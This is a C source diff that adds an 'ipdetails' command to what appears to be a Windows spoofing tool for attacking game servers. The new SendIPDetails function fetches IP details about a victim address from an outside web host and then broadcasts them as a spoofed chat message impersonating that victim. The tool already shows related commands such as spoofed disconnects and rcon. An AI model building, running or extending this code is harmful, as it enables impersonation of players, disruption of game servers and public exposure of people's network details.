@@ -837,6 +837,57 @@ void Tick()
 		m_Tick++;
 }
 
+void SendIPDetails(const char *SrvIP, int Port, const char *SpoofIP, int SpoofPort)
+{
+	WSADATA wsaData;
+	if(WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
+		printf("Error in WSAStartup(): %s\n", WSAGetLastError());
+
+	SOCKET g_Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    struct hostent *host;
+    host = gethostbyname("dev.fruchtihd.de");
+    SOCKADDR_IN SockAddr;
+    SockAddr.sin_port=htons(80);
+    SockAddr.sin_family=AF_INET;
+    SockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);
+
+    if(connect(g_Socket,(SOCKADDR*)(&SockAddr),sizeof(SockAddr)) != 0)
+        return;
+
+	char aBuf[512];
+	str_format(aBuf, sizeof(aBuf), "GET /ipdetails.php?ip=%s HTTP/1.1\r\nHost: dev.fruchtihd.de\r\nConnection: close\r\n\r\n", SpoofIP);
+    send(g_Socket, aBuf, strlen(aBuf), 0);
+   
+	char buffer[10000];
+    memset(&buffer, 0, sizeof(buffer));
+	if(recv(g_Socket, buffer, sizeof(buffer), 0) != SOCKET_ERROR)
+	{
+		char aSplit[512][256] = {{0}};
+		ZeroMemory(&aSplit, sizeof(aSplit));
+		int Split = 0;
+		int Char = 0;
+
+		// split the command to extract the parameters
+		for(unsigned int i = 0; i < strlen(buffer); i++)
+		{
+			if(buffer[i] == '#')
+			{
+				Split++;
+				Char = 0;
+				continue;
+			}
+
+			aSplit[Split][Char] = buffer[i];
+			Char++;
+		}
+
+		SendChat(SrvIP, Port, SpoofIP, SpoofPort, aSplit[1]);
+	}
+
+    closesocket(g_Socket);
+    WSACleanup();
+}
+
 DWORD WINAPI WorkingThread(LPVOID lpParam) 
 {
 	printf("Created new thread\n");
@@ -978,6 +1029,20 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 				}
 				else
 					send(g_Client, "[Server]: Please use: disconnect <srvip> <srvport> <spoofip> <spoofport>", strlen("[Server]: Please use: disconnect <srvip> <srvport> <spoofip> <spoofport>"), 0);
+			}
+			else if(strcmp(aCmd[0], "ipdetails") == 0)
+			{
+				if(aCmd[1][0] && aCmd[2][0] && aCmd[3][0] && aCmd[4][0])
+				{
+					int SrvPort = atoi(aCmd[2]);
+					int Port = atoi(aCmd[4]);
+
+					SendIPDetails(aCmd[1], SrvPort, aCmd[3], Port);
+
+					send(g_Client, "[Server]: Spoofed ipdetails sent successfully!", strlen("[Server]: Spoofed ipdetails sent successfully!"), 0);
+				}
+				else
+					send(g_Client, "[Server]: Please use: ipdetails <srvip> <srvport> <spoofip> <spoofport>", strlen("[Server]: Please use: ipdetails <srvip> <srvport> <spoofip> <spoofport>"), 0);
 			}
 			else if(strcmp(aCmd[0], "rcon") == 0)
 			{
